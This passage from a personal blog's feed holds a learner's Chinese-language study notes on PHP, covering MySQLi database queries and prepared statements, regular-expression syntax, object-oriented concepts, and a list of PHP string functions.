href="https://www.w3cschool.cn/mysql/sql-datatypes.html">规定</a></p><p>同时可以为每个列指定其他选项的属性:<br>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。<br>DEFAULT value - 设置默认值<br>UNSIGNED - 使用无符号数值类型，0 及正数<br>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1<br>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的 PRIMARY KEY 设置为 ID 数值，与AUTO_INCREMENT 一起使用。</p><p>每个表都应该有一个主键(本列为 “id” 列)，主键必须包含唯一的值。</p><h4 id="插入数据-MySQLi-面向对象"><a href="#插入数据-MySQLi-面向对象" class="headerlink" title="插入数据(MySQLi - 面向对象)"></a>插入数据(MySQLi - 面向对象)</h4><p>语法规则:<br>1.PHP 中 SQL 查询语句必须使用引号<br>2.在 SQL 查询语句中的字符串值必须加引号<br>3.数值的值不需要引号<br>4.NULL 值不需要引号<br>向 MySQL 表添加新的记录:<br>INSERT INTO table_name (column1, column2, column3,…)<br>VALUES (value1, value2, value3,…)</p><pre><code>在连接检测和关闭数据库中间加入$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;)&quot;;                    //向 &quot;MyGuests&quot; 表添加新的记录if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;New record created successfully&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125;</code></pre><h4 id="插入多条数据-MySQLi-面向对象"><a href="#插入多条数据-MySQLi-面向对象" class="headerlink" title="插入多条数据(MySQLi - 面向对象)"></a>插入多条数据(MySQLi - 面向对象)</h4><p>【方法一:使用函数】<br>mysqli_multi_query() 函数可用来执行多条SQL语句。</p><pre><code>$sql = &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Mary&#39;, &#39;Moe&#39;, &#39;mary@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Julie&#39;, &#39;Dooley&#39;, &#39;julie@example.com&#39;)&quot;;if ($conn-&gt;multi_query($sql) === TRUE) &#123;echo &quot;Newrecords created successfully&quot;;&#125; else &#123;echo&quot;Error: &quot; . $sql . &quot;&quot; . $conn-&gt;error;&#125;</code></pre><p>注意:每个SQL语句必须用分号隔开。</p><p>【方法二:MySQLi 使用预处理语句】</p><pre><code>// 为 mysqli_stmt_prepare() 初始化statement 对象$stmt =mysqli_stmt_init($conn);//预处理语句if (mysqli_stmt_prepare($stmt, $sql)) &#123;// 绑定参数mysqli_stmt_bind_param($stmt, &#39;sss&#39;, $firstname, $lastname, $email);// 设置参数并执行$firstname = &#39;John&#39;;$lastname= &#39;Doe&#39;;$email =&#39;john@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Mary&#39;;$lastname= &#39;Moe&#39;;$email =&#39;mary@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Julie&#39;;$lastname = &#39;Dooley&#39;;$email =&#39;julie@example.com&#39;;mysqli_stmt_execute($stmt);&#125;</code></pre><p>每个参数必须指定类型，来保证数据的安全性。通过类型的判断可以减少SQL注入漏洞带来的风险。<br>参数类型:<br>i - integer<br>d - double<br>s - string<br>b - BLOB</p><h4 id="MySQLi使用预处理语句-包括面向对象和面向过程"><a href="#MySQLi使用预处理语句-包括面向对象和面向过程" class="headerlink" title="MySQLi使用预处理语句(包括面向对象和面向过程)"></a>MySQLi使用预处理语句(包括面向对象和面向过程)</h4><p>流程:<br>1.预处理:创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记<br>2.数据库解析并编译(内部处理):对SQL语句模板执行查询优化，并存储结果(不输出)<br>3.执行:将应用绑定的值传递给参数（?标记），数据库执行语句。(如果参数的值不一样,可以多次执行语句)</p><p>优点:<br>1.减少了分析时间，只做了一次查询（虽然语句多次执行）<br>2.绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句<br>3.预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</p><pre><code>// 步骤一，prepare and bind$stmt = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)&quot;);$stmt-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);// 步骤三，设置参数并执行$firstname = &quot;John&quot;;$lastname = &quot;Doe&quot;;$email = &quot;john@example.com&quot;;$stmt-&gt;execute();$firstname = &quot;Mary&quot;;$lastname = &quot;Moe&quot;;$email = &quot;mary@example.com&quot;;$stmt-&gt;execute();             $firstname = &quot;Julie&quot;;$lastname = &quot;Dooley&quot;;$email = &quot;julie@example.com&quot;;$stmt-&gt;execute();echo &quot;New records created successfully&quot;;$stmt-&gt;close();</code></pre><p>语句中如果有?就转换为其他类型的数据</p><h4 id="读取数据-MySQLi-面向对象"><a href="#读取数据-MySQLi-面向对象" class="headerlink" title="读取数据(MySQLi - 面向对象)"></a>读取数据(MySQLi - 面向对象)</h4><pre><code>SELECT 语句用于从数据表中读取数据:SELECT column_name(s) FROM table_name我们可以使用 * 号来读取所有数据表中的字段:SELECT * FROM table_name用 WHERE 命令来筛选出满足条件的结果:SELECT column_name(s)  FROM table_name  WHERE column_name operator value——————————————————————————————————————————————————————————————————————————————                           【SELECT】$sql = &quot;SELECT id, firstname, lastname FROM MyGuests&quot;;$result = $conn-&gt;query($sql);if ($result-&gt;num_rows &gt; 0) &#123;    // 输出每行数据    while($row = $result-&gt;fetch_assoc()) &#123;        echo &quot;id: &quot;. $row[&quot;id&quot;]. &quot; - Name: &quot;. $row[&quot;firstname&quot;]. &quot; &quot; . $row[&quot;lastname&quot;]. &quot;&lt;br&gt;&quot;;    &#125;&#125; else &#123;    echo &quot;0 results&quot;;&#125;——————————————————————————————————————————————————————————————————————————————                           【WHERE】$result = mysqli_query($con,&quot;SELECT * FROM PersonsWHERE FirstName=&#39;Peter&#39;&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;] . &quot; &quot; . $row[&#39;LastName&#39;];echo &quot;&lt;br&gt;&quot;;&#125;</code></pre><h4 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h4><pre><code>ORDER BY 关键词用于对记录集中的数据进行排序。SELECT column_name(s)FROM table_nameORDER BY column1, column2... ASC|DESC    默认是升序ASC，DESC改为降序$result = mysqli_query($con,&quot;SELECT * FROM Persons ORDER BY age&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;];echo &quot; &quot; . $row[&#39;LastName&#39;];echo &quot; &quot; . $row[&#39;Age&#39;];echo &quot;&lt;br&gt;&quot;;&#125;可以根据多个列进行排序(第一列的值相同时才使用第二列)</code></pre><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>UPDATE 语句用于更新数据库表中已存在的记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:UPDATE table_name SET column1=value, column2=value2,... WHERE some_column=some_value 操作:mysqli_query($con,&quot;UPDATE Persons SET Age=36WHERE FirstName=&#39;Peter&#39; AND LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>DELETE FROM 语句用于从数据库表中删除记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:DELETE FROM table_name WHERE some_column = some_value操作:mysqli_query($con,&quot;DELETE FROM Persons WHERE LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处"><a href="#PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处" class="headerlink" title="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往此处"></a>PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往<a href="https://www.w3cschool.cn/php/php-mysql-connect.html">此处</a></h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;p&gt;php7之前是mysql链接(硬链接)&lt;br&gt;php7之后是mysqli链接(i链接/improved链接)&lt;/p&gt;
&lt;h4</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221115</title>
    <link href="https://liu1272.github.io/2022/11/15/20221115/"/>
    <id>https://liu1272.github.io/2022/11/15/20221115/</id>
    <published>2022-11-15T14:28:00.000Z</published>
    <updated>2022-11-16T05:41:51.332Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>概念:正则表达式是用于描述字符排列和匹配模式的一种语法规则。<br>作用:<br>1.匹配，也常常用于从字符串中析取信息。<br>2.用新文本代替匹配文本。<br>3.将一个字符串拆分为一组更小的信息块。<br>基本语法:<br>1.正则匹配模式使用分隔符与元字符组成<br>(1)分隔符可以是非数字、非反斜线、非空格的任意字符<br>(2)经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)<br>2.元字符是用于构造规则表达式的具有特殊含义的字符<br>3.如果要在正则表达式中包含元字符本身，必须在其前加上”\”进行转义 </p><pre><code>           【常见元字符】 元字符             说明*                0次、1次或多次匹配其前的原子+                1次或多次匹配其前的原子?                0次或1次匹配其前的原子|                匹配两个或多个选择^                匹配字符串串首的原子$                匹配字符串串尾的原子[]                匹配方括号中的任一原子[^]                匹配除方括号中的原子外的任何字符&#123;m&#125;                表示其前原子恰好出现m次&#123;m,n&#125;            表示其前原子至少出现m次，至少出现n次(n&gt;m)&#123;m,&#125;            表示其前原子出现不少于m次()                整体表示一个原子.                匹配除换行之外的任何一个字符边界限制:1.^和$分别指定字符串的开始和结束。2.^Tom$精确匹配————Tom模糊匹配3.重复匹配:    ?匹配存在?前的一个字母或是不存在这个字母的字符串    *匹配0/1/多次匹配该字母的字符串    +匹配1/多次该字母的字符串    .匹配除换行符外的任何字符    .*组合称为全匹配符或单含匹配符    &#123;&#125;指定原子重复的次数        &#123;m&#125;表示其前原子恰好出现m次；        &#123;m，n&#125;表示其前原子至少出现m次，至多出现n次；        &#123;m，&#125;表示其前原子出现不少于m次。    []匹配其中的一个原子并且地位平等    |匹配多个选择之一，可以连用|4.模式单元:    ()将其中的正则表达式变为原子(或称为模式单元)使用————其实用处相等于数学的括号5.模式匹配的顺序(从高到低):  顺序    元字符         说明  1        （）          模式单元      2       ？* +&#123;&#125;        重复匹配  3         ^$           边界限制  4         |            模式选择</code></pre><p>特殊字符:<br>$匹配输入字符串的结尾位置<br>()标记表达式开始与结束的位置<br>*匹配前面的子表达式0次或多次<br>+匹配前面的子表达式1次或多次<br>.匹配除换行符\n外的任何单字符<br>[标记一个中括号表达式的开始<br>?匹配前面的子表达式0次或一次，或指明一个非贪婪限定符<br>\将下一个字符标记为特殊字符/原义字符/向后引用/八进制转义符<br>^匹配字符串的开始位置(在方括号中表示不接受该字符集合)<br>{标记限定符巴达兽的开始<br>|指明两项之间的一个选择</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>元字符表</title>
    <link href="https://liu1272.github.io/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/"/>
    <id>https://liu1272.github.io/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/</id>
    <published>2022-11-15T05:42:00.000Z</published>
    <updated>2022-11-16T05:45:29.574Z</updated>
    
    <content type="html"><![CDATA[<pre><code>字符     描述\        将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\\’ 匹配 “\” 而 “\(” 则匹配 “(”。^        匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。$        匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。*        匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于&#123;0,&#125;。+        匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 &#123;1,&#125;。?        匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 &#123;0,1&#125;。&#123;n&#125;       n是一个非负整数。匹配确定的 n 次。例如，’o&#123;2&#125;’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。&#123;n,&#125;      n是一个非负整数。至少匹配n 次。例如，’o&#123;2,&#125;’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o&#123;1,&#125;’ 等价于 ‘o+’。’o&#123;0,&#125;’ 则等价于 ‘o*’。&#123;n,m&#125;     m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o&#123;1,3&#125;” 将匹配 “fooooood” 中的前三个 o。’o&#123;0,1&#125;’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。?         当该字符紧跟在任何一个其他限制符 (*, +, ?, &#123;n&#125;, &#123;n,&#125;, &#123;n,m&#125;) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。.         匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。(pattern)    匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘′或‘’。(?:pattern)    匹 配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。(?=pattern)    正 向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?=95|98|NT|2000)’ 能匹配 “Windows 2000″ 中的 “Windows” ，但不能匹配 “Windows 3.1″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。(?!pattern)    负 向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95|98|NT|2000)’ 能匹配 “Windows 3.1″ 中的 “Windows”，但不能匹配 “Windows 2000″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始x|y    匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。[xyz]    字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。[^xyz]    负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p&#39;。[a-z]    字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。[^a-z]    负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。\b    匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B    匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。\cx    匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。\d    匹配一个数字字符。等价于 [0-9]。\D    匹配一个非数字字符。等价于 [^0-9]。\f    匹配一个换页符。等价于 \x0c 和 \cL。\n    匹配一个换行符。等价于 \x0a 和 \cJ。\r    匹配一个回车符。等价于 \x0d 和 \cM。\s    匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。\S    匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。\t    匹配一个制表符。等价于 \x09 和 \cI。\v    匹配一个垂直制表符。等价于 \x0b 和 \cK。\w    匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。\W    匹配任何非单词字符包括下划线。等价于 ‘[^A-Za-z0-9_]’。\xn    匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41′ 匹配 “A”。’\x041′ 则等价于 ‘\x04′ &amp; “1″。正则表达式中可以使用 ASCII 编码。.\num    匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1′ 匹配两个连续的相同字符。\n    标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。\nm    标 识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。\nml    如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。\un    匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。例子 匹配32位md5/^[a-z0-9]&#123;32&#125;$/</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt;字符     描述
\        将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\\’ 匹配 “\” 而 “\(” 则匹配 “(”。
^      </summary>
      
    
    
    
    <category term="附录" scheme="https://liu1272.github.io/categories/%E9%99%84%E5%BD%95/"/>
    
    
    <category term="附录" scheme="https://liu1272.github.io/tags/%E9%99%84%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>20221114</title>
    <link href="https://liu1272.github.io/2022/11/14/20221114/"/>
    <id>https://liu1272.github.io/2022/11/14/20221114/</id>
    <published>2022-11-14T08:34:00.000Z</published>
    <updated>2022-11-15T13:10:44.249Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><p>类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。<br>对象 − 是类的实例。<br>对象的主要三个特性：<br>1.对象的行为：可以对对象施加那些操作，开灯，关灯就是行为。<br>2.对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。<br>3.对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</p><h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</p><p>成员函数 − 定义在类的内部，可用于访问对象的数据。</p><p>继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><p>父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</p><p>子类 − 一个类继承其他类称为子类，也可称为派生类。</p><p>多态 − 多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</p><p>重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</p><p>抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</p><p>封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</p><p>构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><pre><code>【定义函数】&lt;?php                                      //1.定义类class 类名 &#123;  /* 成员变量 */  var $var1;  var $var2 = &quot;constant string&quot;;  /* 成员函数 */  function 成员函数的函数名 ($arg1, $arg2)   &#123;      return $this-&gt;函数 = 变量             //赋值并调用函数  &#125;&#125;?&gt;$对象名 = new 类名;                         //2.创建对象echo $对象名-&gt;成员函数(&quot;传入的参数&quot;);        //3.调用成员方法大括号&#123;&#125;内可以定义变量和方法变量使用 var 来声明, 变量也可以初始化值函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。变量 $this 代表自身的对象【构造函数】在创建对象时， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。&lt;?phpclass 类名 &#123;   function __construct() &#123;       print &quot;构造函数&quot;;       $this-&gt;name = &quot;&quot;;   &#125;   function __destruct() &#123;       print &quot;销毁&quot; . $this-&gt;name . &quot;\n&quot;;   &#125;&#125;$obj = new 类名();?&gt;【继承】子类继承父类的特征和行为，使得子类对象具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为(父类=基类)&lt;?php // 子类扩展站点类别class 类名 &#123;           //extends继承一个类   var $category;    function setCate($par)&#123;        $this-&gt;category = $par;    &#125;    function getCate()&#123;        echo $this-&gt;category . PHP_EOL;    &#125;&#125;注意:PHP 不支持多继承【方法重写】顾名思义重新定义function【访问控制】PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有）protected(受保护的)只能被自身子父类访问private(私有的)只能被定义的类访问publice(公有的)可以在任何地方访问类属性必须被定义，var视为publice【接口】概念:指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。特性:通过interface定义，但是其中定义的所有方法都必须是公有而且要是空的。类可以实现多个接口，用逗号来分隔多个接口的名称。【常量】在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。常量的值必须是一个定值【接口与抽象类】1. 接口（1）对接口的使用是通过关键字implements（2）接口不能定义成员变量（包括类静态变量），能定义常量（3）子类必须实现接口定义的所有方法（4）接口只能定义不能实现该方法（5）接口没有构造函数（6）接口中的方法和实现它的类默认都是public类型的2. 抽象类（1）对抽象类的使用是通过关键字extends（2）不能被实例化，可以定义子类必须实现的方法（3）子类必须定义父类中的所有抽象方法，这些方法的访问控制必须和父类中一样（或者更为宽松）（4）如一个类中有一个抽象方法，则该类必须定义为抽象类（5）抽象类可以有构造函数（6）抽象类中的方法可以使用private,protected,public来修饰。（7）一个类可以同时实现多个接口，但一个类只能继承于一个抽象类。【关键字】1.Static(1)声明类属性或方法为 static(静态)，就可以不实例化类而直接访问(2)静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。(3)由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。(4)静态属性不可以由对象通过 -&gt; 操作符来访问。2.Final(1)如果父类中的方法被声明为 final，则子类无法覆盖该方法。(2)如果一个类被声明为 final，则不能被继承。【调用父类构造方法】PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() </code></pre><h4 id="面向对象暂时先写到这里，后面有新的认识再回来更改。"><a href="#面向对象暂时先写到这里，后面有新的认识再回来更改。" class="headerlink" title="面向对象暂时先写到这里，后面有新的认识再回来更改。"></a>面向对象暂时先写到这里，后面有新的认识再回来更改。</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;类与对象&quot;&gt;&lt;a href=&quot;#类与对象&quot; class=&quot;headerlink&quot; title=&quot;类与对象&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221113</title>
    <link href="https://liu1272.github.io/2022/11/13/20221113/"/>
    <id>https://liu1272.github.io/2022/11/13/20221113/</id>
    <published>2022-11-13T07:41:00.000Z</published>
    <updated>2022-11-14T08:57:18.149Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="仔细收集php的常见字符操作函数"><a href="#仔细收集php的常见字符操作函数" class="headerlink" title="仔细收集php的常见字符操作函数"></a>仔细收集php的常见字符操作函数</h4><pre><code>addcslashes — 以 C 语言风格使用反斜线转义字符串中的字符addslashes — 使用反斜线引用字符串bin2hex — 函数把包含数据的二进制字符串转换为十六进制值chop — rtrim 的别名 — 删除字符串末端的空白字符（或者其他字符）chr — 返回指定的字符 — chr ( int $ascii )chunk_split — 将字符串分割成小块convert_cyr_string — 将字符由一种 Cyrillic 字符转换成另一种convert_uudecode — 解码一个 uuencode 编码的字符串convert_uuencode — 使用 uuencode 编码一个字符串count_chars — 返回字符串所用字符的信息crc32 — 计算一个字符串的 crc32 多项式crypt — 单向字符串散列echo — 输出一个或多个字符串explode — 使用一个字符串分割另一个字符串fprintf — 将格式化后的字符串写入到流get_html_translation_table — 返回使用 htmlspecialchars 和 htmlentities 后的转换表hebrev — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew）hebrevc — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符hex2bin — 转换十六进制字符串为二进制字符串html_entity_decode — Convert HTML entities to their corresponding charactershtmlentities — 将字符转换为 HTML 转义字符htmlspecialchars_decode — 将特殊的 HTML 实体转换回普通字符htmlspecialchars — 将特殊字符转换为 HTML 实体implode — 将一个一维数组的值转化为字符串join — 别名 implodelcfirst — 使一个字符串的第一个字符小写levenshtein — 计算两个字符串之间的编辑距离localeconv — Get numeric formatting informationltrim — 删除字符串开头的空白字符（或其他字符）md5_file — 计算指定文件的 MD5 散列值md5 — 计算字符串的 MD5 散列值metaphone — Calculate the metaphone key of a stringmoney_format — 将数字格式化成货币字符串nl_langinfo — Query language and locale informationnl2br — 在字符串所有新行之前插入 HTML 换行标记number_format — 以千位分隔符方式格式化一个数字ord — 转换字符串第一个字节为 0-255 之间的值parse_str — 将字符串解析成多个变量print — 输出字符串printf — 输出格式化字符串quoted_printable_decode — 将 quoted-printable 字符串转换为 8-bit 字符串quoted_printable_encode — 将 8-bit 字符串转换成 quoted-printable 字符串quotemeta — 转义元字符集rtrim — 删除字符串末端的空白字符（或者其他字符）setlocale — 设置地区信息sha1_file — 计算文件的 sha1 散列值sha1 — 计算字符串的 sha1 散列值similar_text — 计算两个字符串的相似度soundex — Calculate the soundex key of a stringsprintf — Return a formatted stringsscanf — 根据指定格式解析输入的字符str_contains — Determine if a string contains a given substringstr_ends_with — Checks if a string ends with a given substringstr_getcsv — 解析 CSV 字符串为一个数组str_ireplace — str_replace 的忽略大小写版本str_pad — 